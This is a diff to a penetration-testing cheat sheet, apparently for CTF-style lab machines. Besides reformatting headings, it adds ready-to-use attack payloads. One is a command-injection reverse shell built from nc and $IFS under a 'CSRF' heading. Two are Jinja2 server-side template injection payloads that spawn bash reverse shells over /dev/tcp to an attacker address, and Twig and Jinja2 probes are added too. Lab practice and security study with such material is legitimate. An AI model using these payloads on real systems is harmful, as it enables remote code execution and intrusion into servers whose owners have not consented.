@@ -126,9 +126,9 @@ UDP Scan:
 nmap -sU -sV -p- 10.10.10.77
 ```
 
-### If Web Server
+## If Web Server
 
-Brute dir with extensions
+### Brute dir with extensions
 
 * #### GoBuster
 
@@ -148,6 +148,48 @@ VHOST Discovery
 
 ```
 ffuf -w subdomains-top1million-110000.txt -u https://10.10.10.77/ -H "Host:FUZZ.10.10.10.77"
+```
+
+### CSRF
+
+Check CSRF
+
+```
+<a href="http://10.10.10.10:4444">MyURL</a>
+```
+
+Reverse shell
+
+```
+http://10.10.10.10/$(nc.traditional$IFS-e$IFS/bin/bash$IFS'10.10.10.10'$IFS'4444')
+```
+
+### SSTI [:octocat:](https://github.com/swisskyrepo/PayloadsAllTheThings/tree/master/Server%20Side%20Template%20Injection#jinja2)
+
+![](https://gblobscdn.gitbook.com/assets%2F-L_2uGJGU7AVNRcqRvEi%2F-M7O4Hp6bOFFkge_yq4G%2F-M7OCvxwZCiaP8Whx2fi%2Fimage.png?alt=media&token=4b40cf58-5561-4925-bc86-1d4689ca53d1)
+
+* #### Check Jinja2
+
+```
+{{7*'7'}} would result in 7777777
+{{config.items()}}
+```
+
+Reverse shell
+
+```
+{% for x in ().__class__.__base__.__subclasses__() %}{% if "warning" in x.__name__ %}{{x()._module.__builtins__['__import__']('os').popen("bash -c 'bash -i >& /dev/tcp/10.10.10.10/1234 0>&1'").read()}}{%endif%}{%endfor%}
+```
+
+```
+{{request.application.globals.builtins.import('os').popen('/bin/bash -c "/bin/bash -i >& /dev/tcp/10.10.10.10/4444 0>&1"').read()}}
+```
+
+* #### Check Twig
+
+```
+{{7*'7'}} would result in 49
+{{dump(app)}}
 ```
 
 ## Privilege Escalation
